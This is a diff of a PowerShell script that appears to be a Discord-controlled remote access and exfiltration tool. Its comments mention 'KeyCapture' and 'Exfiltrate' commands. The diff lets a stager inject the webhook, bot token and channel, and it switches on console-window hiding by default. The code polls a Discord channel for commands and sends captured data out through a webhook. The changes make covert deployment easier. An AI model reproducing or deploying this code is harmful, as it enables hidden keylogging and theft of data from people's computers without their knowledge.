@@ -11,9 +11,9 @@ SETUP
 1. make a discord bot at https://discord.com/developers/applications/
 2. add the bot to your discord server
 3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
-3. Change YOUR_WEBHOOK_URL to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-4. Change YOUR_BOT_TOKEN_HERE with your bot token
-5. Change WEBHOOK_CHANNEL_ID to the channel id of your webhook.
+3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+4. Change $tk below with your bot token
+5. Change $ch below to the channel id of your webhook.
 
 USAGE
 1. Setup the script
@@ -29,17 +29,16 @@ Killswitch
 Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
 #>
 
-# Uncomment the lines below and add your details
-$hookurl = "YOUR_WEBHOOK_HERE" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-$token = "YOUR_BOT_TOKEN_HERE" # make sure your bot is in the same server as the webhook
-$channel_id = 'WEBHOOK_CHANNEL_ID' # make sure the bot AND webhook can access this channel
+# CHANGE below and add your details (only if not defined in a stageer)
+$hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+$token = "$tk" # make sure your bot is in the same server as the webhook
+$chan = "$ch" # make sure the bot AND webhook can access this channel
 
-if ($hookurl -like "YOUR_WEBHOOK_HERE"){$hookurl = "$dc"}
 # Shortened webhook detection
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 # HIDE THE WINDOW - Change to 1 to hide the console window
-$HideWindow = 0
+$HideWindow = 1
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -91,7 +90,7 @@ function PullMsg {
     }
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$channel_id/messages")
+    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
     
     if ($response) {
         $most_recent_message = ($response | ConvertFrom-Json)[0]
